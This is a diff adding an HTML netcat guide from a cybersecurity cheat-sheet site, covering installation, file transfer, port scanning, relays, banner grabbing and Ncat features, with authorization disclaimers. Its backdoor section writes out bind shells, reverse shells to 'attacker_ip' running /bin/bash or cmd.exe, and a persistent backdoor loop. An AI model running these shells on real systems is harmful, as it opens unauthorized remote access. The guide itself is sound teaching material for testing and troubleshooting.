@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netcat Guide - Cybersecurity Cheat Sheet</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="../guide-styles.css">
+</head>
+<body>
+    <div class="guide-container">
+        <header class="guide-header">
+            <h1>Netcat: The Swiss Army Knife of Networking</h1>
+            <p>Master Network Communication and Testing</p>
+            <a href="../index.html" class="back-link">&larr; Back to Cheat Sheet</a>
+        </header>
+
+        <main class="guide-content">
+            <section id="introduction">
+                <h2>What is Netcat?</h2>
+                <p>Netcat (nc) is a versatile networking utility that can read and write data across network connections using TCP or UDP protocols. Often called the "Swiss Army knife" of networking tools, it can function as a simple TCP/UDP client or server, port scanner, backdoor, or network relay. It's an essential tool for network troubleshooting, testing, and security assessment.</p>
+            </section>
+
+            <section id="installation">
+                <h2>Installation & Setup</h2>
+                <div class="command-block">
+                    <h3>Linux Installation</h3>
+                    <pre><code># Ubuntu/Debian (traditional netcat)
+sudo apt update && sudo apt install netcat
+
+# Ubuntu/Debian (OpenBSD netcat - recommended)
+sudo apt install netcat-openbsd
+
+# CentOS/RHEL
+sudo yum install nc
+
+# Arch Linux
+sudo pacman -S gnu-netcat</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>macOS Installation</h3>
+                    <pre><code># Pre-installed on macOS
+nc -h
+
+# Install via Homebrew (for latest version)
+brew install netcat</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Windows Installation</h3>
+                    <pre><code># Download Ncat (Nmap's netcat)
+# https://nmap.org/ncat/
+
+# Or use Windows Subsystem for Linux
+wsl sudo apt install netcat-openbsd</code></pre>
+                </div>
+            </section>
+
+            <section id="basic-usage">
+                <h2>Basic Usage & Syntax</h2>
+                <div class="command-block">
+                    <h3>Command Structure</h3>
+                    <pre><code># Basic syntax
+nc [options] [hostname] [port]
+
+# Connect to a host
+nc example.com 80
+
+# Listen on a port
+nc -l -p 1234
+
+# UDP mode
+nc -u example.com 53</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Common Options</h3>
+                    <pre><code># Listen mode
+-l          # Listen for incoming connections
+
+# Port specification
+-p port     # Specify port number
+
+# Protocol options
+-u          # Use UDP instead of TCP
+-4          # Force IPv4
+-6          # Force IPv6
+
+# Timeout and timing
+-w timeout  # Connection timeout in seconds
+-i interval # Delay interval between lines
+
+# Output options
+-v          # Verbose output
+-n          # Don't resolve hostnames
+-z          # Zero-I/O mode (port scanning)</code></pre>
+                </div>
+            </section>
+
+            <section id="client-server">
+                <h2>Client-Server Communication</h2>
+                <div class="command-block">
+                    <h3>Simple Chat Server</h3>
+                    <pre><code># Server (listen on port 1234)
+nc -l -p 1234
+
+# Client (connect to server)
+nc localhost 1234
+
+# Now type messages on either side to communicate</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Web Server Testing</h3>
+                    <pre><code># Connect to web server
+nc google.com 80
+
+# Send HTTP request
+GET / HTTP/1.1
+Host: google.com
+
+# Press Enter twice to send request</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>UDP Communication</h3>
+                    <pre><code># UDP server
+nc -u -l -p 1234
+
+# UDP client
+nc -u localhost 1234
+
+# Test DNS server
+echo "google.com" | nc -u 8.8.8.8 53</code></pre>
+                </div>
+            </section>
+
+            <section id="file-transfer">
+                <h2>File Transfer</h2>
+                <div class="command-block">
+                    <h3>Send Files</h3>
+                    <pre><code># Receiver (server)
+nc -l -p 1234 > received_file.txt
+
+# Sender (client)
+nc target_host 1234 < file_to_send.txt
+
+# Send binary files
+nc -l -p 1234 > received_image.jpg
+nc target_host 1234 < image.jpg</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Directory Transfer</h3>
+                    <pre><code># Send directory (receiver)
+nc -l -p 1234 | tar -xzf -
+
+# Send directory (sender)
+tar -czf - /path/to/directory | nc target_host 1234
+
+# Compressed transfer
+nc -l -p 1234 | gunzip > large_file.txt
+gzip -c large_file.txt | nc target_host 1234</code></pre>
+                </div>
+            </section>
+
+            <section id="port-scanning">
+                <h2>Port Scanning</h2>
+                <div class="command-block">
+                    <h3>Basic Port Scanning</h3>
+                    <pre><code># Scan single port
+nc -z -v example.com 80
+
+# Scan port range
+nc -z -v example.com 20-25
+
+# Scan multiple ports
+nc -z -v example.com 22 80 443
+
+# UDP port scan
+nc -u -z -v example.com 53</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Advanced Scanning</h3>
+                    <pre><code># Fast scan with timeout
+nc -z -v -w 1 example.com 1-1000
+
+# Scan and save results
+nc -z -v example.com 1-100 2>&1 | grep succeeded
+
+# Scan multiple hosts
+for host in 192.168.1.{1..10}; do
+    nc -z -v -w 1 $host 22
+done</code></pre>
+                </div>
+            </section>
+
+            <section id="backdoors-shells">
+                <h2>Backdoors & Reverse Shells</h2>
+                <div class="command-block">
+                    <h3>Bind Shell</h3>
+                    <pre><code># Target machine (creates backdoor)
+nc -l -p 4444 -e /bin/bash
+
+# Attacker machine (connects to backdoor)
+nc target_ip 4444
+
+# Windows bind shell
+nc -l -p 4444 -e cmd.exe</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Reverse Shell</h3>
+                    <pre><code># Attacker machine (listener)
+nc -l -p 4444
+
+# Target machine (connects back)
+nc attacker_ip 4444 -e /bin/bash
+
+# Windows reverse shell
+nc attacker_ip 4444 -e cmd.exe</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Persistent Backdoor</h3>
+                    <pre><code># Create persistent listener
+while true; do
+    nc -l -p 4444 -e /bin/bash
+done
+
+# One-liner persistent backdoor
+nc -l -p 4444 -e /bin/bash; nc -l -p 4444 -e /bin/bash</code></pre>
+                </div>
+            </section>
+
+            <section id="network-relay">
+                <h2>Network Relay & Proxying</h2>
+                <div class="command-block">
+                    <h3>Simple Relay</h3>
+                    <pre><code># Create relay between two services
+mkfifo backpipe
+nc -l -p 8080 0<backpipe | nc target_host 80 1>backpipe
+
+# Relay with logging
+nc -l -p 8080 | tee log.txt | nc target_host 80</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Port Forwarding</h3>
+                    <pre><code># Forward local port to remote service
+nc -l -p 8080 -c "nc remote_host 80"
+
+# Bidirectional relay
+mkfifo /tmp/fifo
+nc -l -p 8080 < /tmp/fifo | nc target_host 80 > /tmp/fifo</code></pre>
+                </div>
+            </section>
+
+            <section id="banner-grabbing">
+                <h2>Banner Grabbing & Service Detection</h2>
+                <div class="command-block">
+                    <h3>Common Services</h3>
+                    <pre><code># HTTP banner
+echo "HEAD / HTTP/1.0\r\n\r\n" | nc example.com 80
+
+# SMTP banner
+nc mail.example.com 25
+
+# FTP banner
+nc ftp.example.com 21
+
+# SSH banner
+nc ssh.example.com 22
+
+# Telnet banner
+nc telnet.example.com 23</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Automated Banner Grabbing</h3>
+                    <pre><code># Script to grab banners from multiple ports
+#!/bin/bash
+for port in 21 22 23 25 53 80 110 143 443 993 995; do
+    echo "Port $port:"
+    timeout 3 nc -v target_host $port < /dev/null
+    echo "---"
+done</code></pre>
+                </div>
+            </section>
+
+            <section id="network-testing">
+                <h2>Network Testing & Troubleshooting</h2>
+                <div class="command-block">
+                    <h3>Connectivity Testing</h3>
+                    <pre><code># Test if port is open
+nc -z -v example.com 80
+
+# Test with timeout
+nc -z -v -w 5 example.com 80
+
+# Test UDP connectivity
+nc -u -z -v example.com 53
+
+# Test multiple ports quickly
+nc -z -v example.com 80 443 22 21</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Performance Testing</h3>
+                    <pre><code># Bandwidth test (receiver)
+nc -l -p 1234 > /dev/null
+
+# Bandwidth test (sender)
+dd if=/dev/zero bs=1M count=100 | nc target_host 1234
+
+# Latency test
+time echo "test" | nc example.com 80</code></pre>
+                </div>
+            </section>
+
+            <section id="security-testing">
+                <h2>Security Testing</h2>
+                <div class="command-block">
+                    <h3>Firewall Testing</h3>
+                    <pre><code># Test outbound connections
+nc -z -v external_host 80 443 22
+
+# Test inbound connections
+nc -l -p 1234 -v
+
+# Test specific protocols
+nc -u -z -v dns_server 53</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Service Enumeration</h3>
+                    <pre><code># Enumerate web servers
+for port in 80 8080 8443 443; do
+    nc -z -v target_host $port
+done
+
+# Check for common backdoor ports
+for port in 1234 4444 5555 6666 7777 8888 9999; do
+    nc -z -v -w 1 target_host $port
+done</code></pre>
+                </div>
+            </section>
+
+            <section id="advanced-techniques">
+                <h2>Advanced Techniques</h2>
+                <div class="command-block">
+                    <h3>Hex Mode</h3>
+                    <pre><code># Send hex data
+echo -e "\x47\x45\x54\x20\x2f" | nc example.com 80
+
+# Receive and display hex
+nc -l -p 1234 | hexdump -C</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Scripting with Netcat</h3>
+                    <pre><code>#!/bin/bash
+# Port scanner script
+host=$1
+start_port=$2
+end_port=$3
+
+for ((port=$start_port; port<=$end_port; port++)); do
+    if nc -z -v -w 1 $host $port 2>&1 | grep -q "succeeded"; then
+        echo "Port $port is open"
+    fi
+done</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Traffic Analysis</h3>
+                    <pre><code># Monitor network traffic
+nc -l -p 1234 | tee traffic.log
+
+# Analyze HTTP requests
+nc -l -p 8080 | grep -E "(GET|POST|PUT|DELETE)"
+
+# Log connections with timestamps
+nc -l -p 1234 | while read line; do
+    echo "$(date): $line"
+done</code></pre>
+                </div>
+            </section>
+
+            <section id="ncat-features">
+                <h2>Ncat (Nmap's Netcat) Features</h2>
+                <div class="command-block">
+                    <h3>SSL/TLS Support</h3>
+                    <pre><code># SSL client
+ncat --ssl example.com 443
+
+# SSL server
+ncat -l --ssl --ssl-cert cert.pem --ssl-key key.pem 443
+
+# SSL with certificate verification
+ncat --ssl --ssl-verify example.com 443</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Access Control</h3>
+                    <pre><code># Allow specific hosts
+ncat -l --allow 192.168.1.100 1234
+
+# Deny specific hosts
+ncat -l --deny 192.168.1.200 1234
+
+# Allow subnet
+ncat -l --allow 192.168.1.0/24 1234</code></pre>
+                </div>
+            </section>
+
+            <section id="tips">
+                <h2>Pro Tips & Best Practices</h2>
+                <ul>
+                    <li><strong>Use verbose mode:</strong> -v flag provides valuable connection information</li>
+                    <li><strong>Set timeouts:</strong> Use -w to prevent hanging connections</li>
+                    <li><strong>Combine with other tools:</strong> Pipe output to grep, awk, or other utilities</li>
+                    <li><strong>Test both TCP and UDP:</strong> Many services use both protocols</li>
+                    <li><strong>Use for quick tests:</strong> Faster than writing custom network code</li>
+                    <li><strong>Script repetitive tasks:</strong> Automate scanning and testing</li>
+                    <li><strong>Monitor with logging:</strong> Use tee to log while displaying output</li>
+                    <li><strong>Consider Ncat for advanced features:</strong> SSL, access control, IPv6</li>
+                </ul>
+            </section>
+
+            <section id="troubleshooting">
+                <h2>Common Issues & Troubleshooting</h2>
+                <div class="command-block">
+                    <h3>Connection Issues</h3>
+                    <pre><code># Check if port is actually listening
+netstat -tuln | grep :1234
+
+# Verify firewall rules
+sudo iptables -L
+
+# Test local connectivity first
+nc -z -v localhost 1234</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Permission Issues</h3>
+                    <pre><code># Binding to privileged ports (< 1024) requires root
+sudo nc -l -p 80
+
+# Use unprivileged ports for testing
+nc -l -p 8080</code></pre>
+                </div>
+                <div class="command-block">
+                    <h3>Version Differences</h3>
+                    <pre><code># Check netcat version
+nc -h
+
+# Different versions have different options
+# Traditional netcat: -p for port
+# OpenBSD netcat: port as argument
+# GNU netcat: various extensions</code></pre>
+                </div>
+            </section>
+
+            <section id="security-considerations">
+                <h2>Security Considerations</h2>
+                <div class="command-block">
+                    <p><strong>WARNING:</strong> Netcat can be dangerous if misused:</p>
+                    <ul>
+                        <li><strong>Backdoors:</strong> Can create unauthorized access points</li>
+                        <li><strong>Data exposure:</strong> Transmits data in plaintext by default</li>
+                        <li><strong>Firewall bypass:</strong> Can tunnel traffic through allowed ports</li>
+                        <li><strong>Privilege escalation:</strong> Shell access can lead to system compromise</li>
+                    </ul>
+                    <p>Always use netcat responsibly and only on systems you own or have explicit permission to test.</p>
+                </div>
+            </section>
+
+            <section id="legal-disclaimer">
+                <h2>Legal Disclaimer</h2>
+                <div class="command-block">
+                    <p><strong>WARNING:</strong> Netcat should only be used for:</p>
+                    <ul>
+                        <li>Testing your own networks and systems</li>
+                        <li>Authorized penetration testing with written permission</li>
+                        <li>Educational purposes in controlled lab environments</li>
+                        <li>Legitimate network troubleshooting and administration</li>
+                    </ul>
+                    <p>Creating backdoors, unauthorized access, or using netcat for malicious purposes is illegal and unethical. Always obtain proper authorization before testing network security.</p>
+                </div>
+            </section>
+        </main>
+    </div>
+</body>
+</html>
